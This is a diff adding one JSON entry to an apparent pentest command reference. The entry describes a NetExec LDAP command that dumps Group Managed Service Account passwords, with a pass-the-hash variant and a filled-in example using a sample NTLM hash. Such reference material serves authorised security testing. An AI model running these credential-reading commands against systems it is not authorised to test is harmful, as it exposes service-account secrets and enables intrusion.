@@ -1,0 +1,30 @@
+{
+  "id": "nxc-ldap-gmsa",
+  "name": "NetExec LDAP gMSA Dump",
+  "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' --gmsa",
+  "description": "Read Group Managed Service Account passwords via NetExec",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "nxc",
+    "ldap",
+    "gmsa",
+    "service-account",
+    "password"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' --gmsa"
+    }
+  ],
+  "examples": [
+    "nxc ldap '192.168.1.2' -u 'provisioningsvc' -H '44dea6608c25a85d578d0c2b6f8355c4' --gmsa"
+  ]
+}
